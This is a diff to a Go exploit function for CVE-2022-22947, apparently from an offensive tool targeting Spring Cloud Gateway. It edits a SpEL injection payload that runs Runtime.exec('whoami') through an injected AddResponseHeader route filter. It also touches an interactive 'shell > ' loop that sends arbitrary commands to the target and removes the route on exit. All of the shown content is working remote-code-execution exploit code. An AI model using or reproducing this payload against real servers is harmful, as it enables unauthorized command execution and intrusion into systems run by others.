@@ -47,7 +47,7 @@ func CVE_2022_22947(url string) {
               "id": "hacktest",
               "filters": [{
                 "name": "AddResponseHeader",
-                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"}
+                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"}
                 }],
               "uri": "http://example.com",
               "order": 0
@@ -129,7 +129,6 @@ func CVE_2022_22947(url string) {
 			fmt.Print("shell > ")
 			Cmd, _ = reader.ReadString('\n')
 			Cmd = strings.TrimSpace(Cmd)
-			//Cmd = strings.Replace(Cmd, " ", "+", -1)
 			if Cmd == "exit" {
 				req4, err := http.NewRequest("DELETE", urltest, nil)
 				if err != nil {
@@ -185,7 +184,6 @@ func CVE_2022_22947(url string) {
 					fmt.Println("Error reading response:", err)
 					return
 				}
-
 				res := common.ExtractResult(string(body), `s*'([^']*)'`)
 				result := strings.Replace(res, "\\n", "\n", -1)
 				fmt.Println(result)
